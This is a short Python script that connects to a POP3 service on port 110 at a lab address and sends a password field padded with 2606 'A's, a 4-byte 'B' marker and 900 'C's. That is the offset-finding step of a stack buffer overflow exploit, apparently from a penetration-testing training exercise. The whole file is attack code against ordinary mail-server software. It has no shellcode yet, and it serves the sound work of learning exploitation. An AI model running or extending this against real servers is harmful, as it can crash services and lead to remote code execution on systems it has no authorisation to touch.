#!/usr/bin/python

import socket


buffer = "A" * 2606 + "B" * 4 + "C" * 900
#Send all the strings made
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.11.10.130', 110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
